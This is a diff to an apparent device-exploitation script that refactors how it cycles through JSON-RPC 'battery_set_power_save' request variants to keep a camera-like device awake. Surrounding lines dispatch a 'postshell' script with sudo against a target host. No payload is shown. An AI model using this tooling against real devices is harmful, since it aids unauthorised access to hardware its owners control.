@@ -74,6 +74,24 @@ def grab_and_postshell():
     subprocess.run(["sudo","-n","bash","deliverables/scripts/c460_postshell.sh",HOST], capture_output=True, timeout=180)
     log("postshell dispatched")
 
+SO_IDX = 0
+SO_SHAPES = (
+                {"method": "battery_set_power_save", "params": {"cur_status": 0, "power_save": {"enable": False}}},
+                {"method": "battery_set_power_save", "params": {"cur_status": 1, "power_save": 0}},
+                {"method": "battery_set_power_save", "params": {"cur_status": "0", "power_save": "0"}},
+                {"method": "battery_set_power_save", "params": {"power_save": {"enable": 0}}},
+                {"method": "battery_set_power_save", "params": {"power_save": {"enabled": False}}},
+                {"method": "battery_set_power_save", "params": {"power_save": 0}},
+                {"method": "battery_set_power_save", "params": {"power_save": False}},
+                {"method": "battery_set_power_supply_mode", "params": {"mode": "wired_always_on"}},
+                {"method": "battery_set_power_supply_mode", "params": {"power_supply_mode": {"mode": 0}}},
+                {"method": "battery_set_power_supply_mode", "params": {"power_supply_mode": 1}},
+                {"method": "battery_set_power_save", "params": {}},
+                {"method": "battery_set_power_save", "params": {"cur_status": 0}},
+                {"method": "battery_set_power_save"},
+)
+
+
 def try_sleep_off(sess, variants):
     """Ask for sleep-off; returns True when a shape is accepted.
 
@@ -114,21 +132,9 @@ def main():
             log(f"DS UP (try {tries}) — disabling sleep + bursting from index {idx}")
             emit("ds_state", {"state": "up", "tries": tries, "idx": idx})
             sess = stok  # T.login returns the whole session (stok/seq/lsk/ivb)
-            SO_FAST = (
-                {"method": "battery_set_power_save", "params": {"cur_status": 0, "power_save": {"enable": False}}},
-                {"method": "battery_set_power_save", "params": {"cur_status": 1, "power_save": 0}},
-                {"method": "battery_set_power_save", "params": {"cur_status": "0", "power_save": "0"}},
-                {"method": "battery_set_power_save", "params": {"power_save": {"enable": 0}}},
-                {"method": "battery_set_power_save", "params": {"power_save": {"enabled": False}}},
-                {"method": "battery_set_power_save", "params": {"power_save": 0}},
-                {"method": "battery_set_power_save", "params": {"power_save": False}},
-                {"method": "battery_set_power_supply_mode", "params": {"mode": "wired_always_on"}},
-                {"method": "battery_set_power_supply_mode", "params": {"power_supply_mode": {"mode": 0}}},
-                {"method": "battery_set_power_supply_mode", "params": {"power_supply_mode": 1}},
-                {"method": "battery_set_power_save", "params": {}},
-                {"method": "battery_set_power_save", "params": {"cur_status": 0}},
-                {"method": "battery_set_power_save"},
-            )
+            globals()["SO_IDX"] = (SO_IDX + 4) % len(SO_SHAPES)
+            n = len(SO_SHAPES)
+            SO_FAST = tuple(SO_SHAPES[(SO_IDX + k) % n] for k in range(min(4, n)))
             SO_REST = ()
             if try_sleep_off(sess, SO_FAST):
                 SO_REST = ()
